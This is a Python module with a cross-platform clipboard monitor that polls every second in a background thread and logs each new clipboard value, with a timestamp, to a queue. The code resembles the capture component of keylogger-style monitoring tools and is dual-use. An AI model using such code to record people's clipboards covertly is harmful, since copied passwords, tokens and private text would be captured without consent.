import platform
import subprocess
import threading
import time
import datetime

class ClipboardHandler:
    def __init__(self, logger):
        self.logger = logger
        self.clipboard_last = None
        self.stop_event = threading.Event()

    def get_clipboard(self):
        system = platform.system()
        try:
            if system == "Windows":
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return data
            elif system == "Darwin":
                p = subprocess.Popen(['pbpaste'], stdout=subprocess.PIPE)
                data, _ = p.communicate()
                return data.decode('utf-8')
            elif system == "Linux":
                # Try xclip first
                p = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                data, err = p.communicate()
                if p.returncode != 0:
                    # fallback to xsel
                    p = subprocess.Popen(['xsel', '-b', '-o'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    data, err = p.communicate()
                    if p.returncode != 0:
                        self.logger.warning("Clipboard utilities xclip/xsel not found or not working.")
                        return None
                return data.decode('utf-8')
            else:
                return None
        except Exception as e:
            self.logger.error(f"Error getting clipboard data: {e}")
            return None

    def clipboard_monitor(self, log_queue):
        while not self.stop_event.is_set():
            data = self.get_clipboard()
            if data and data != self.clipboard_last:
                self.clipboard_last = data
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] Clipboard changed: {data}"
                log_queue.put(log_entry)
            time.sleep(1)

    def start(self, log_queue):
        t = threading.Thread(target=self.clipboard_monitor, args=(log_queue,), daemon=True)
        t.start()
        return t

    def stop(self):
        self.stop_event.set()
